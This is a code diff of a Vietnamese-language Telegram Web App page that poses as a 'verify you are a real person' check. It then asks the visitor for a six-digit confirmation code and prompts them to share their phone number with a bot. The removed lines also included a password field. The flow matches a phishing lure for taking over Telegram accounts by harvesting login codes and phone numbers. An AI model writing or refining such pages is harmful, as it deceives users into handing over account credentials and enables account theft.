@@ -6,35 +6,36 @@
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
 <style>
-body { margin:0; font-family: Arial; overflow:hidden; }
+body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
 
-/* nền blur nhẹ */
+/* nền ảnh */
 .bg {
   position: fixed;
   width: 100%;
   height: 100%;
-  background: url("https://i.imgur.com/your-image.jpg") center/cover no-repeat;
+  background: url("https://sf-static.upanhlaylink.com/img/image_20260324de75528845a06e58dc6de699d22000db.jpg") center/cover no-repeat;
   filter: blur(4px);
   transform: scale(1.05);
 }
 
-/* overlay */
+/* overlay đen nhẹ */
 .overlay {
   position: fixed;
   width:100%; height:100%;
-  background: rgba(0,0,0,0.3);
+  background: rgba(0,0,0,0.25);
 }
 
 /* icon vẫy tay */
 .icon {
   position:absolute;
-  top:30%;
+  top:25%;
   left:50%;
   transform:translate(-50%,-50%);
   font-size:90px;
   animation: wave 1.2s infinite;
 }
 
+/* animation vẫy */
 @keyframes wave {
   0% { transform: translate(-50%, -50%) rotate(0deg); }
   15% { transform: translate(-50%, -50%) rotate(14deg); }
@@ -45,51 +46,46 @@ body { margin:0; font-family: Arial; overflow:hidden; }
   100% { transform: translate(-50%, -50%) rotate(0deg); }
 }
 
-/* box Step 1 */
+/* hộp nội dung */
 .box {
-  position: relative;      /* không absolute */
-  margin: 60px 20px;       /* cách trên và 2 bên */
+  position:absolute;
+  bottom:100px;
+  left:20px; right:20px;
   background:#fff;
-  padding:20px;
+  padding:18px 15px;
   border-radius:15px;
   text-align:center;
+  font-size:17px;
+  font-weight:500;
+  color:#111;
 }
 
-/* button Step 1 */
-#step1 .btn {
-  position: relative;   /* nằm trong box, không absolute */
-  margin-top: 15px;
+/* nút */
+.btn {
   width: 90%;
+  margin-top:12px;
+  background:#3b9edb;
+  color:#fff;
   padding:14px;
   border:none;
   border-radius:10px;
-  font-size:16px;
-  background:#3b9edb;
-  color:white;
+  font-size:17px;
   cursor:pointer;
 }
 
-/* input */
-.input {
-  width:90%;
-  padding:12px;
-  margin-top:10px;
-  border-radius:10px;
-  border:1px solid #ccc;
-}
-
-/* code box */
+/* mã code */
 .code-box {
   display:flex;
   justify-content:center;
   gap:5px;
-  margin-top:10px;
+  margin-top:12px;
 }
-
 .code-box input {
-  width:35px; height:45px;
+  width:38px; height:48px;
   text-align:center;
-  font-size:18px;
+  font-size:20px;
+  border-radius:8px;
+  border:1px solid #ccc;
 }
 </style>
 </head>
@@ -99,31 +95,19 @@ body { margin:0; font-family: Arial; overflow:hidden; }
 <div class="bg"></div>
 <div class="overlay"></div>
 
-<!-- Icon vẫy tay -->
+<!-- icon vẫy tay -->
 <div class="icon">👋</div>
 
 <!-- STEP 1 -->
 <div class="box" id="step1">
-  Bạn cần xác nhận mình là người thật, hãy nhấp vào nút bên dưới để bắt đầu!
+  Bạn cần xác nhận mình là người thật,<br>
+  hãy nhấp vào nút bên dưới để bắt đầu!
   <button class="btn" onclick="step2()">Xác nhận</button>
 </div>
 
-<script>
-let tg = window.Telegram.WebApp;
-tg.expand();
-
-function step2(){
-  document.getElementById("step1").style.display="none";
-  // document.getElementById("step2").style.display="block"; // thêm Step 2 sau này
-}
-</script>
-
-</body>
-</html>
 <!-- STEP 2 -->
 <div class="box" id="step2" style="display:none;">
   Nhập mã xác nhận
-
   <div class="code-box">
     <input maxlength="1" oninput="move(this,0)">
     <input maxlength="1" oninput="move(this,1)">
@@ -133,36 +117,29 @@ function step2(){
     <input maxlength="1" oninput="move(this,5)">
   </div>
 
-  <!-- Nút share số điện thoại -->
   <button class="btn" onclick="requestPhone()">📲 Chia sẻ số điện thoại</button>
-</div>
-<!-- STEP 3 -->
-<div class="box" id="step3" style="display:none;">
-  Bạn đã nhập đúng mã (demo)
-  <input type="password" class="input" placeholder="Mật khẩu của bạn">
 </div>
 
 <script>
 let tg = window.Telegram.WebApp;
 tg.expand();
 
-const inputs = document.querySelectorAll(".code-box input");
-
+// chuyển từ Step 1 -> Step 2
 function step2(){
-  document.getElementById("step1").style.display="none";
-  document.getElementById("step2").style.display="block";
+  document.getElementById("step1").style.display = "none";
+  document.getElementById("step2").style.display = "block";
 }
 
+// tự động nhảy ô nhập mã
+const inputs = document.querySelectorAll(".code-box input");
 function move(el,i){
-  if(el.value.length==1 && i<5) inputs[i+1].focus();
+  if(el.value.length == 1 && i < 5) inputs[i+1].focus();
+}
 
-  let code="";
-  inputs.forEach(x=>code+=x.value);
-
-  if(code.length==6){
-    document.getElementById("step2").style.display="none";
-    document.getElementById("step3").style.display="block";
-  }
+// gửi yêu cầu share số điện thoại về bot
+function requestPhone(){
+    tg.sendData("request_phone");
+    tg.showAlert("Nhấn nút chia sẻ số điện thoại trong Telegram để tiếp tục!");
 }
 </script>
 
